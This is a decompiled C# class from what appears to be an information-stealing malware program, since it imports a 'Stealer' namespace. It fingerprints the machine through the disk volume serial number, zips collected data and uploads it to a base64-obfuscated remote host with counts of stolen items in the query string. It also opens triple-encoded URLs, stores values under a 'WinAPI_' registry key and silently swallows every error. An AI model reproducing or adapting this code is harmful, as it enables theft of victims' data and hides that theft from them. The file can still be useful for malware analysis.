using System;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using Stealer;

// Token: 0x0200000A RID: 10
internal class Class6
{
	// Token: 0x0600002A RID: 42 RVA: 0x00004AC4 File Offset: 0x00002CC4
	public static string smethod_0()
	{
		string result;
		try
		{
			string str = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
			ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + str + ":\"");
			managementObject.Get();
			char[] array = managementObject["VolumeSerialNumber"].ToString().ToCharArray();
			Array.Reverse(array);
			result = Convert.ToBase64String(Encoding.UTF8.GetBytes(array.ToString())).Replace("=", "").ToUpper();
		}
		catch (Exception)
		{
			result = Convert.ToBase64String(Encoding.UTF8.GetBytes(Class6.smethod_2())).Replace("=", "").ToUpper();
		}
		return result;
	}

	// Token: 0x0600002B RID: 43 RVA: 0x00004B84 File Offset: 0x00002D84
	public static bool smethod_1()
	{
		bool result;
		Class6.mutex_0 = new Mutex(true, Program.id, ref result);
		return result;
	}

	// Token: 0x0600002C RID: 44 RVA: 0x00004BA4 File Offset: 0x00002DA4
	public static string smethod_2()
	{
		return Path.GetRandomFileName().Replace(".", "");
	}

	// Token: 0x0600002D RID: 45 RVA: 0x00004BC8 File Offset: 0x00002DC8
	public static void smethod_3(string string_0, string string_1)
	{
		try
		{
			ZipFile.CreateFromDirectory(string_0, string_1, CompressionLevel.Optimal, false);
		}
		catch
		{
		}
	}

	// Token: 0x0600002E RID: 46 RVA: 0x00004BF4 File Offset: 0x00002DF4
	public static void smethod_4(string string_0, string string_1, string string_2)
	{
		try
		{
			new WebClient().UploadFile(string.Concat(new string[]
			{
				Class6.smethod_5("aHR0cHM6Ly9kb2Rvb3MucnU="),
				"/fifa/fifa.php?hwid=",
				Class6.smethod_0(),
				"&ci=",
				string_1,
				"&p=",
				Class10.string_0,
				"&c=",
				Class10.VadjZxyuNw,
				"&a=",
				Class10.string_1,
				"&f=",
				Class10.string_2,
				"&t=",
				Class10.string_3,
				"&fz=",
				Class10.string_4,
				"&s=",
				Class10.string_5,
				"&cr=",
				Class10.string_6,
				"&ds=",
				Class10.string_7,
				(Class10.string_9 != "") ? (" &dd=" + Class10.string_9.Replace(";", "\r\n")) : "&dd=",
				"&pd=",
				Class10.string_8
			}), "POST", string_0);
		}
		catch
		{
		}
	}

	// Token: 0x0600002F RID: 47 RVA: 0x00004D54 File Offset: 0x00002F54
	private static string smethod_5(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	// Token: 0x06000030 RID: 48 RVA: 0x00004D78 File Offset: 0x00002F78
	public static void smethod_6(string string_0)
	{
		try
		{
			WebClient webClient = new WebClient();
			webClient.OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(Convert.FromBase64String(string_0)))))));
		}
		catch
		{
		}
	}

	// Token: 0x06000031 RID: 49 RVA: 0x00004DD8 File Offset: 0x00002FD8
	public static void smethod_7(string string_0, string string_1)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("WinAPI_" + Program.id);
			registryKey.SetValue(string_0, string_1);
			registryKey.Close();
		}
		catch
		{
		}
	}

	// Token: 0x06000032 RID: 50 RVA: 0x00004E24 File Offset: 0x00003024
	public static string smethod_8(string string_0)
	{
		string result = null;
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("WinAPI_" + Program.id);
			result = registryKey.GetValue(string_0).ToString();
			registryKey.Close();
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x06000033 RID: 51 RVA: 0x00004E78 File Offset: 0x00003078
	public static void smethod_9(string string_0, string string_1, string string_2)
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_0);
			httpWebRequest.Headers.Add("Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
			httpWebRequest.UserAgent = string_1;
			httpWebRequest.Referer = "fleximwithsorano [" + string_2 + "]";
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8))
			{
				streamReader.ReadToEnd();
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000034 RID: 52 RVA: 0x0000224C File Offset: 0x0000044C
	public Class6()
	{
		Class13.Cyiv2R6zubiV2();
		base..ctor();
	}

	// Token: 0x04000010 RID: 16
	private static Mutex mutex_0;
}
